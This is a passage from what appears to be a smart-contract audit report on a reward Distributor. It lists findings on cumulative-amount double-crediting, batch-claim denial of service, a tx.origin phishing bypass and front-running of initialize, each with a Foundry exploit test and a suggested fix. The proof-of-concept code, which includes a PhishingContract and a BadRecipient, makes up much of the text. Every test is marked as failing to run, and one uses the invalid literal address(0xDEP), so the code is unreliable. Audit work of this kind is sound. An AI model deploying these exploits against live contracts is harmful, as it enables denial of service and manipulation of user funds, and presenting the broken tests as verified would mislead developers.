The `_claim` function passes the `amount` parameter (which represents the **cumulative** total claimed by the user over time) to the `IClaimRecipient(recipient).onClaim` hook, rather than the `toSend` (incremental) amount actually transferred in the current transaction. Standard DeFi integrations generally expect hooks to report the amount received/transferred in the current interaction. A recipient contract using this `amount` parameter to update internal accounting (e.g., minting vault shares) will incorrectly credit the user with the cumulative total every time they claim a small increment, leading to massive double-counting and potential insolvency of the recipient contract.

## Impact
Recipient contracts (vaults, wrappers) integrating with Merkl will likely double-count deposits, issuing more shares/credit than assets received, leading to protocol insolvency.

## Command to Run Test


## Proof of Concept
1. User has previously claimed 100 tokens. Cumulative `amount` = 100.
2. New reward cycle adds 10 tokens. Cumulative `amount` = 110.
3. User claims. `toSend` = 10. `safeTransfer` sends 10 tokens.
4. `onClaim` is called with `amount` = 110.
5. Recipient contract (trusting the params) credits User with 110 tokens.
6. Recipient is now insolvent (credited 110, received 10).

## Proof of Code
import "forge-std/Test.sol";
import {Distributor, MerkleTree} from "contracts/Distributor.sol";
import {IAccessControlManager} from "contracts/interfaces/IAccessControlManager.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IClaimRecipient} from "contracts/interfaces/IClaimRecipient.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000000 ether);
    }
}

contract VulnerableRecipient is IClaimRecipient {
    uint256 public totalCredited;
    bytes32 public constant CALLBACK_SUCCESS = keccak256("IClaimRecipient.onClaim");

    function onClaim(address user, address token, uint256 amount, bytes memory data) external returns (bytes32) {
        // Vulnerability: Recipient assumes 'amount' matches the tokens transferred in this transaction
        totalCredited += amount;
        return CALLBACK_SUCCESS;
    }
}

contract MockAccessControl is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract DistributorTest is Test {
    Distributor distributor;
    MockToken token;
    VulnerableRecipient recipient;
    MockAccessControl accessControl;
    
    address user;

    function setUp() public {
        accessControl = new MockAccessControl();
        distributor = new Distributor();
        distributor.initialize(accessControl);
        
        token = new MockToken();
        token.transfer(address(distributor), 1000 ether);
        
        recipient = new VulnerableRecipient();
        user = address(this);
    }

    function testDoubleCreditingInHook() public {
        // 1. Setup Epoch 1: User has earned 100 tokens
        uint256 amountEpoch1 = 100 ether;
        // Create a simple tree where the root is the leaf (empty proof)
        bytes32 leaf1 = keccak256(abi.encode(user, address(token), amountEpoch1));
        
        distributor.updateTree(MerkleTree({merkleRoot: leaf1, ipfsHash: bytes32(0)}));
        vm.warp(block.timestamp + 2 hours);

        // Prepare claim data
        address[] memory users = new address[](1); users[0] = user;
        address[] memory tokens = new address[](1); tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1); amounts[0] = amountEpoch1;
        bytes32[][] memory proofs = new bytes32[][](1); proofs[0] = new bytes32[](0);
        
        address[] memory recipients = new address[](1); recipients[0] = address(recipient);
        bytes[] memory datas = new bytes[](1); datas[0] = "0x"; // Trigger hook

        // Claim Epoch 1
        distributor.claimWithRecipient(users, tokens, amounts, proofs, recipients, datas);
        
        // Check: Recipient received 100 tokens, credited 100. Correct.
        assertEq(token.balanceOf(address(recipient)), 100 ether);
        assertEq(recipient.totalCredited(), 100 ether);
        
        // 2. Setup Epoch 2: User has earned 110 tokens (10 new tokens)
        uint256 amountEpoch2 = 110 ether;
        bytes32 leaf2 = keccak256(abi.encode(user, address(token), amountEpoch2));
        
        distributor.updateTree(MerkleTree({merkleRoot: leaf2, ipfsHash: bytes32(0)}));
        vm.warp(block.timestamp + 2 hours);

        // Update claim amount
        amounts[0] = amountEpoch2;
        
        // Claim Epoch 2
        distributor.claimWithRecipient(users, tokens, amounts, proofs, recipients, datas);

        // BUG DEMONSTRATION:
        // Actual transfer was 10 tokens (110 - 100).
        assertEq(token.balanceOf(address(recipient)), 110 ether); // 100 + 10
        
        // However, onClaim was called with cumulative `amount` (110) instead of incremental `toSend` (10).
        // Recipient added 110 to totalCredited. Total = 100 + 110 = 210.
        assertEq(recipient.totalCredited(), 210 ether, "Insolvency: Recipient credited more than received");
    }
}

## Suggested Mitigation
Update the `_claim` function in `Distributor.sol` to pass the incremental `toSend` amount to the `onClaim` hook instead of the cumulative `amount`.

```solidity
// Inside _claim function
if (toSend != 0) {
    IERC20(token).safeTransfer(recipient, toSend);
    if (data.length != 0) {
        // Fix: Pass 'toSend' instead of 'amount'
        try IClaimRecipient(recipient).onClaim(user, token, toSend, data) returns (bytes32 callbackSuccess) {
            if (callbackSuccess != CALLBACK_SUCCESS) revert Errors.InvalidReturnMessage();
        } catch {}
    }
}
```





 **Derived From** : GriefableCallbacks

## [M-16]. Malicious claim recipient can DoS batch claiming via invalid return value

### Finding Severity Justification: The vulnerability allows a single malicious user to disrupt batch claiming operations (Denial of Service) by setting a claim recipient that returns an invalid value. This exploits a specific behavior of Solidity's `try/catch` statement where reverts inside the success block are not caught. While it does not lead to direct theft of funds, it breaks the functionality of batch processing, which is critical for gas efficiency and automated distribution workflows (e.g., by operators), qualifying it as a Medium severity griefing/DoS issue.
## Derived From Pattern/Invariant
GriefableCallbacks

## Exploit Type
Dos

## Location
Distributor._claim

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_claim`, the external call to `onClaim` is wrapped in a `try/catch` block intended to isolate failures. However, inside the `try` block, the code explicitly checks `if (callbackSuccess != CALLBACK_SUCCESS) revert Errors.InvalidReturnMessage();`. This revert is **not** caught by the `try/catch` (which only catches reverts from the external call itself). Therefore, if a recipient returns a success boolean but an invalid return value (e.g., `bytes32(0)`), the entire transaction reverts. This allows a malicious user to set a griefing recipient contract that forces all batch claims including their user to fail.

## Impact
Denial of Service for operators or integrations that use `claimWithRecipient` and attach data payloads to claims. A single malicious user in a batch can force the entire transaction to revert by setting a recipient that returns an invalid value, preventing others in the batch from receiving their funds.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a recipient contract `BadRecipient` that implements `onClaim` but returns `bytes32(0)` instead of `CALLBACK_SUCCESS`. 
2. Attacker calls `setClaimRecipient` to set this contract as their recipient.
3. An operator or integrator attempts to batch claim for users [User A, Attacker] using `claimWithRecipient`, passing non-empty `data` (e.g., for accounting or hooks).
4. `_claim` processes User A successfully.
5. `_claim` processes Attacker. Since `data.length != 0`, `IClaimRecipient(recipient).onClaim` is executed.
6. The call returns `bytes32(0)`. The check `if (callbackSuccess != CALLBACK_SUCCESS)` fails and executes `revert Errors.InvalidReturnMessage()`.
7. This revert is not caught by the `try/catch` block (which only catches execution reverts), causing the entire batch transaction to fail.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/Distributor.sol";
import "../contracts/interfaces/IAccessControlManager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract BadRecipient {
    function onClaim(address, address, uint256, bytes calldata) external pure returns (bytes32) {
        return bytes32(0); // Invalid return value
    }
}

contract DistributorDoSTest is Test {
    Distributor distributor;
    MockToken token;
    BadRecipient badRecipient;
    address user1 = address(0x1);
    address user2 = address(0x2);

    function setUp() public {
        MockACM acm = new MockACM();
        distributor = new Distributor();
        distributor.initialize(acm);
        token = new MockToken();
        token.mint(address(distributor), 1000 ether);
        badRecipient = new BadRecipient();
    }

    function testBatchDoS() public {
        // 1. Setup Merkle Tree for 2 users
        bytes32 leaf1 = keccak256(abi.encode(user1, address(token), 100));
        bytes32 leaf2 = keccak256(abi.encode(user2, address(token), 100));
        
        bytes32 root;
        bytes32[] memory proof1 = new bytes32[](1);
        bytes32[] memory proof2 = new bytes32[](1);

        // Sort leaves
        if (uint256(leaf1) < uint256(leaf2)) {
            root = keccak256(abi.encode(leaf1, leaf2));
            proof1[0] = leaf2;
            proof2[0] = leaf1;
        } else {
            root = keccak256(abi.encode(leaf2, leaf1));
            proof1[0] = leaf1;
            proof2[0] = leaf2;
        }

        distributor.updateTree(MerkleTree({merkleRoot: root, ipfsHash: bytes32(0)}));
        vm.warp(block.timestamp + 2 days); // Skip dispute period

        // 2. User2 sets malicious recipient
        vm.prank(user2);
        distributor.setClaimRecipient(address(badRecipient), address(token));

        // 3. Prepare Batch Data
        address[] memory users = new address[](2);
        users[0] = user1;
        users[1] = user2;
        
        address[] memory tokens = new address[](2);
        tokens[0] = address(token);
        tokens[1] = address(token);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100;
        amounts[1] = 100;
        
        bytes32[][] memory proofs = new bytes32[][](2);
        proofs[0] = proof1;
        proofs[1] = proof2;

        address[] memory recipients = new address[](2);
        recipients[0] = address(0);
        recipients[1] = address(0);

        bytes[] memory datas = new bytes[](2);
        datas[0] = hex"01"; // Must provide data to trigger callback
        datas[1] = hex"01";

        // 4. Expect Revert due to User2's bad recipient return value
        vm.expectRevert(Errors.InvalidReturnMessage.selector);
        distributor.claimWithRecipient(users, tokens, amounts, proofs, recipients, datas);
    }
}

## Suggested Mitigation
Remove the explicit revert when the return value is invalid. This aligns the behavior with the `catch` block (which ignores execution reverts), ensuring that a malicious recipient cannot block the distribution.

```solidity
if (data.length != 0) {
    try IClaimRecipient(recipient).onClaim(user, token, amount, data) returns (bytes32 callbackSuccess) {
        // if (callbackSuccess != CALLBACK_SUCCESS) { 
        //    emit ClaimCallbackFailed(user, recipient); // Optional: emit warning instead of reverting
        // }
    } catch {}
}
```





 **Derived From** : AccessControlOrAuthByPass

## [M-17]. Bypass of operator whitelist via tx.origin check

### Finding Severity Justification: The use of `tx.origin` allows an attacker (via a phishing contract) to bypass the intended access controls and inject arbitrary `data` into the `onClaim` callback of a user's configured recipient. While the attacker cannot redirect the funds (they are forced to the user's pre-set recipient), they can manipulate the execution logic of the recipient contract (e.g., swapping parameters, slippage) leading to potential loss of yield or funds. This bypasses the trust assumption that data flowing from the Distributor is user-authorized.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
Distributor._claim

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `_claim`, the authorization check `msg.sender != user && tx.origin != user` allows a malicious contract to call `claim` on behalf of a user if `tx.origin` is the user. While the funds are sent to the user, the attacker can provide arbitrary `data` for the `onClaim` hook. This allows phishing attacks where a user interacting with a malicious contract triggers a claim with a malicious payload, potentially causing the user's recipient contract to misbehave or the user to incur unwanted tax events/gas costs.

## Impact
The `tx.origin` check allows an attacker (via a phishing contract) to bypass the intended access controls. While the attacker cannot redirect the funds (the contract forces them to the user's pre-set recipient), they can inject arbitrary `data` into the `onClaim` callback. This allows the attacker to manipulate the execution logic of the recipient contract (e.g., executing unintended re-staking instructions or trade parameters) if the recipient relies on `data` being user-authorized.

## Command to Run Test


## Proof of Concept
The vulnerability relies on the logic `if (msg.sender != user && tx.origin != user ...)` to revert unauthorized calls. If a user interacts with a malicious contract (making `tx.origin == user` but `msg.sender == maliciousContract`), the condition fails to revert. The malicious contract can then call `claimWithRecipient` with arbitrary `bytes data`. Although the `recipient` address argument is ignored (reverting to the user's saved recipient), the `data` argument is passed through to the `onClaim` hook of that recipient.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Distributor, MerkleTree} from "contracts/Distributor.sol";
import {IAccessControlManager} from "contracts/interfaces/IAccessControlManager.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Reward", "RWD") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACM is IAccessControlManager {
    function isGovernor(address) external pure returns (bool) { return true; }
    function isGovernorOrGuardian(address) external pure returns (bool) { return true; }
}

contract MockRecipient {
    bytes public receivedData;
    function onClaim(address, address, uint256, bytes memory data) external returns (bytes32) {
        receivedData = data;
        return keccak256("IClaimRecipient.onClaim");
    }
}

contract PhishingContract {
    function exploit(address distributor, address user, address token, uint256 amount, bytes32[] calldata proof) external {
        address[] memory users = new address[](1);
        users[0] = user;
        address[] memory tokens = new address[](1);
        tokens[0] = token;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        bytes32[][] memory proofs = new bytes32[][](1);
        proofs[0] = proof;
        address[] memory recipients = new address[](1);
        // Recipient is ignored if msg.sender != user, but data is NOT ignored
        recipients[0] = address(0);
        bytes[] memory datas = new bytes[](1);
        datas[0] = hex"DEADBEEF"; // Malicious payload

        Distributor(distributor).claimWithRecipient(users, tokens, amounts, proofs, recipients, datas);
    }
}

contract DistributorTxOriginTest is Test {
    Distributor distributor;
    MockToken token;
    MockRecipient recipient;
    PhishingContract attacker;
    address user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(new MockACM());
        
        token = new MockToken();
        token.mint(address(distributor), 1000e18);
        
        recipient = new MockRecipient();
        attacker = new PhishingContract();
        
        // Set trusted updater for setup
        vm.prank(address(this));
        distributor.toggleTrusted(address(this));
    }

    function test_BypassAuthWithTxOrigin() public {
        // 1. Setup Merkle Tree for user
        uint256 amount = 100e18;
        bytes32 leaf = keccak256(abi.encode(user, address(token), amount));
        // Single leaf tree, root is leaf
        MerkleTree memory tree = MerkleTree({merkleRoot: leaf, ipfsHash: bytes32(0)});
        
        distributor.updateTree(tree);
        vm.warp(block.timestamp + 3601); // Pass dispute period

        // 2. User configures a smart contract recipient (e.g. a vault)
        vm.prank(user);
        distributor.setClaimRecipient(address(recipient), address(token));

        // 3. User is phished to call the malicious contract
        // We simulate this by pranking user as tx.origin
        vm.prank(user, user); 
        attacker.exploit(address(distributor), user, address(token), amount, new bytes32[](0));

        // 4. Verify exploit: 
        // - Claim succeeded (token balance moved)
        // - Recipient received malicious data via onClaim
        assertEq(token.balanceOf(address(recipient)), amount);
        assertEq(recipient.receivedData(), hex"DEADBEEF");
    }
}

## Suggested Mitigation
Remove the `tx.origin != user` check entirely. The condition should strictly check `msg.sender != user` along with the whitelist/operator mappings. This ensures that a claim can only be initiated directly by the user or by an explicitly authorized operator/contract, eliminating the phishing vector.





 **Derived From** : InitOrderOrUnintialized

## [L-18]. Front-running of initialize allows takeover of DistributionCreator

### Finding Severity Justification: The vulnerability allows an attacker to front-run the initialization of the contract, taking ownership of the specific proxy instance. However, this occurs during deployment (Time=0). If front-run, the legitimate deployer's transaction will revert or fail verification. The deployer can simply discard the compromised proxy and redeploy. The impact is limited to gas loss for the deployer (griefing). There is no theft of user funds or permanent protocol takeover, as the compromised contract would not be used by the protocol. Therefore, it does not meet the criteria for High or Medium severity.
## Derived From Pattern/Invariant
InitOrderOrUnintialized

## Exploit Type
FrontrunMev

## Location
DistributionCreator.initialize

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `initialize` function is external and permissionless. The deployment scripts deploy the proxy and call `initialize` in separate steps/transactions. An attacker can observe the proxy deployment and front-run the `initialize` transaction to set themselves as the `accessControlManager` and `feeRecipient`, gaining full control over the contract.

## Impact
Takeover of the specific proxy instance being deployed. The attacker gains administrative control over the uninitialized contract, forcing the deployer to abandon the compromised proxy and redeploy. This results in gas loss (griefing) but does not affect the actual protocol funds or users as the contract is not yet in use.

## Command to Run Test


## Proof of Concept
1. Deployer deploys `ERC1967Proxy` pointing to the `DistributionCreator` implementation, passing empty bytes `""` for the initialization data.
2. Attacker detects the pending proxy deployment in the mempool.
3. Attacker sends an `initialize(...)` transaction with their own `AccessControlManager` and higher gas price.
4. Attacker's transaction executes first, claiming ownership of the proxy instance.
5. Deployer's subsequent `initialize` transaction reverts as the contract is already initialized.

## Proof of Code
import { Test } from "forge-std/Test.sol";
import { DistributionCreator } from "../contracts/DistributionCreator.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IAccessControlManager } from "../contracts/interfaces/IAccessControlManager.sol";

contract FrontRunInitTest is Test {
    DistributionCreator implementation;
    address attacker = address(0xBAD);
    address deployer = address(0xDEP);
    address attackerACM = address(0x666);
    address mockACM = address(0x123);
    address distributor = address(0x456);

    function setUp() public {
        implementation = new DistributionCreator();
    }

    function testFrontRunInitialization() public {
        // 1. Deployer deploys the proxy with empty data (non-atomic init)
        vm.prank(deployer);
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
        DistributionCreator dc = DistributionCreator(address(proxy));

        // 2. Attacker front-runs the initialization
        vm.startPrank(attacker);
        // Attacker sets themselves as ACM and sets fees
        dc.initialize(IAccessControlManager(attackerACM), address(0xdead), 0);
        vm.stopPrank();

        // 3. Verify attacker took over
        assertEq(address(dc.accessControlManager()), attackerACM);

        // 4. Deployer's legitimate initialization fails
        vm.prank(deployer);
        vm.expectRevert("Initializable: contract is already initialized");
        dc.initialize(IAccessControlManager(mockACM), distributor, 0);
    }
}

## Suggested Mitigation
Call `initialize` atomically during proxy deployment using the `data` parameter of the `ERC1967Proxy` constructor.



